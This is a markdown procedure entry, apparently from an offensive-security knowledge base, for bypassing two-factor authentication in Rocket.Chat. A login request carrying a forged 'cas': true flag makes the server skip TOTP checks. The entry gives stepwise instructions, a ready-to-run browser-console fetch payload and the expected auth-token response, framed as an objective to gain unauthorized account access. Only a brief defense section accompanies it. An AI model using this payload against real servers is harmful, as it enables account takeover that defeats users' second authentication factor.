---
tags:
  - bypass
  - exploit
  - 2fa
  - rocket-chat
type: procedure
tools:
  - '[[tools/Web-Inspector]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/rocket-chat-2fa-bypass-js]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:11.181Z'
sub_techniques: []
id: e77b38bd-27c7-4029-be02-34f37dd571d5
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
---
# Execute Rocket.Chat 2FA Bypass Script

## Summary

This procedure exploits a flaw in Rocket.Chat's 2FA handler by sending a login request with 'cas': true, causing the server to skip TOTP validation as per the logic in app/2fa/server/loginHandler.js (lines 17-42).

## Description

The vulnerability stems from the server treating a client-sent 'cas' parameter as truthy to assume CAS authentication, bypassing TOTP checks without server-side CAS verification. Target the /api/v1/login endpoint with valid username/password, invalid TOTP, and 'cas': true. Requires browser console access post-inspection. Outcome: Successful authentication and account access.

## Requirements

1. Valid credentials for a 2FA-enabled account.
2. Open Web Inspector console on the login page.
3. Invalid TOTP code (e.g., '000000').

## Defense

Defensive measures and detection strategies:

- Validate 'cas' parameter server-side against actual CAS configuration.
- Log and reject requests with unexpected 'cas' flags.
- Update Rocket.Chat to patched version (post-report #1448268).

## Objectives

1. Bypass TOTP validation using the CAS flag.
2. Gain unauthorized access to the account.
3. Confirm exploitation via auth token receipt.

## Instructions

### Step 1: Prepare Console

**Context**: Switch to script execution mode.

In Developer Tools, go to the 'Console' tab. Ensure the login page is loaded.

> Expected output: Ready console prompt.

### Step 2: Run Bypass Script

**Context**: Send modified POST request to skip 2FA.

Execute [[commands/rocket-chat-2fa-bypass-js]] in the console, substituting your actual username, password, and an invalid code.

```javascript
fetch('/api/v1/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    user: 'your_username',
    password: 'your_password',
    code: '000000',
    cas: true
  })
}).then(response => response.json()).then(data => console.log(data));
```

> Expected output: {"status":"success","data":{"authToken":"...","userId":"..."}} logged to console, followed by dashboard access.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/rocket-chat-2fa-bypass-js]]

## Tools Used

- [[tools/Web-Inspector]]

## Tags

- [[bypass]]
- [[exploit]]
- [[2fa]]
- [[rocket-chat]]
